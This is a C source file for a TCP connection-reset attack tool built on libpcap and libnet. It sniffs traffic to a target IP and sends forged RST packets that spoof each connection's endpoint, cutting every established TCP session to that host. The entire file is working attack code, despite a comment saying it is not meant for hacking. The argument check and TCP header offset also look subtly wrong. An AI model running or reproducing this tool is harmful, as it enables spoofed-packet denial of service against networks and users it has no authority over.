// Author  : Constantine Apostolou <conmarap@gmail.com>
// License : GNU GPL v3
//	     (c) Copyright 2012 Cinux
// -----------------------------------------------------------------------------------
// Just to be clear:
//
// This is FREE SOFTWARE made to fulfill my passion for software and the magic hidden 
// behind computers, bits and bytes. These programs are NOT made for hacking purposes
// or to make a hackers/exploiters life easier. I was really close to keeping them 
// closed source just to be sure, but its just fine as it is now.
//
// -----------------------------------------------------------------------------------


// Linux API header files
#include <libnet.h>
#include <pcap.h>
// Cinux API header files
#include "include/csys.h"
#include "include/hijack.h"

// Main function
int main(int argc, char *argv[])
{
   struct pcap_pkthdr cap_header;
   const u_char *packet, *pkt_data;
   pcap_t *pcap_handle;
   char errbuf[PCAP_ERRBUF_SIZE]; // same size as LIBNET_ERRBUF_SIZE
   char *device;
   u_long target_ip;
   int network;
   struct data_pass critical_libnet_data;

   if(argc < 1)
   {
      printf("Usage: %s <IP>\n", argv[0]);
      
      exit(0);
   }
   
   target_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE);

   if (target_ip == -1)
   {
      fatal("Invalid target address");
   }
   
   device = pcap_lookupdev(errbuf);
   if(device == NULL)
   {
      fatal(errbuf);
   }
   
   pcap_handle = pcap_open_live(device, 128, 1, 0, errbuf);
   if(pcap_handle == NULL)
   {
      fatal(errbuf);
   }
   
   critical_libnet_data.libnet_handle = libnet_open_raw_sock(IPPROTO_RAW);
   if(critical_libnet_data.libnet_handle == -1)
   {
      libnet_error(LIBNET_ERR_FATAL, "Unable to access network interface.\n"
      "  -- This program must run as root. Run \"su\" and then run again this program\n");
   }

   libnet_init_packet(LIBNET_IP_H + LIBNET_TCP_H, &(critical_libnet_data.packet));
   if (critical_libnet_data.packet == NULL)
   {
      libnet_error(LIBNET_ERR_FATAL, "Unable to initialize packet memory.\n");
   }

   libnet_seed_prand();

   set_packet_filter(pcap_handle, (struct in_addr *)&target_ip);

   printf("Resetting all TCP connections to %s on %s\n", argv[1], device);
   pcap_loop(pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data);

   pcap_close(pcap_handle);
}

/* sets a packet filter to look for established TCP connections to target_ip */
int set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip)
{
   struct bpf_program filter;
   char filter_string[100];

   sprintf(filter_string, "tcp[tcpflags] & tcp-ack != 0 and dst host %s", inet_ntoa(*target_ip));

   printf("CINMSG: filter string is \'%s\'\n", filter_string);
   if(pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1)
   {
      fatal("pcap_compile failed");
   }

   if(pcap_setfilter(pcap_hdl, &filter) == -1)
   {
      fatal("pcap_setfilter failed");
   }
}

void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet)
{
   u_char *pkt_data;
   struct libnet_ip_hdr *IPhdr;
   struct libnet_tcp_hdr *TCPhdr;
   struct data_pass *passed;
   int bcount;

   passed = (struct data_pass *) user_args; // pass data using a pointer to a struct 

   IPhdr = (struct libnet_ip_hdr *) (packet + LIBNET_ETH_H);
   TCPhdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

   printf("resetting TCP connection from %s:%d ",
         inet_ntoa(IPhdr->ip_src), htons(TCPhdr->th_sport));
   printf("<---> %s:%d\n", 
         inet_ntoa(IPhdr->ip_dst), htons(TCPhdr->th_dport));

   // Method                                    // Explanation
   // --------------------------------------------------------------------------------
   libnet_build_ip(LIBNET_TCP_H,      		// size of the packet sans IP header 
      IPTOS_LOWDELAY,                 		// IP tos 
      libnet_get_prand(LIBNET_PRu16), 		// IP ID (randomized) 
      0,                              		// frag stuff 
      libnet_get_prand(LIBNET_PR8),   		// TTL (randomized) 
      IPPROTO_TCP,                    		// transport protocol 
      *((u_long *)&(IPhdr->ip_dst)),  		// source IP (pretend we are dst) 
      *((u_long *)&(IPhdr->ip_src)),  		// destination IP (send back to src) 
      NULL,                           		// payload (none) 
      0,                              		// payload length 
      passed->packet);                		// packet header memory 

   libnet_build_tcp(htons(TCPhdr->th_dport),	// source TCP port (pretend we are dst) 
      htons(TCPhdr->th_sport),        		// destination TCP port (send back to src) 
      htonl(TCPhdr->th_ack),          		// sequence number (use previous ack) 
      libnet_get_prand(LIBNET_PRu32), 		// acknowledgement number (randomized) 
      TH_RST,                         		// control flags (RST flag set only) 
      libnet_get_prand(LIBNET_PRu16), 		// window size (randomized) 
      0,                              		// urgent pointer 
      NULL,                           		// payload (none) 
      0,                              		// payload length 
      (passed->packet) + LIBNET_IP_H);		// packet header memory 
   // --------------------------------------------------------------------------------

   if (libnet_do_checksum(
     passed->packet, 
     IPPROTO_TCP, 
     LIBNET_TCP_H) == -1)
   {
      libnet_error(LIBNET_ERR_FATAL, 
		   "Unable to compute packet's checksum\n");
   }

   bcount = libnet_write_ip(passed->libnet_handle, 
			    passed->packet, 
			    LIBNET_IP_H+LIBNET_TCP_H);
   if (bcount < LIBNET_IP_H + LIBNET_TCP_H)
   {
      libnet_error(LIBNET_ERR_WARNING, 
		   "Warning: Incomplete data written to packet.\n");
   }

   usleep(5000); // pause slightly
}
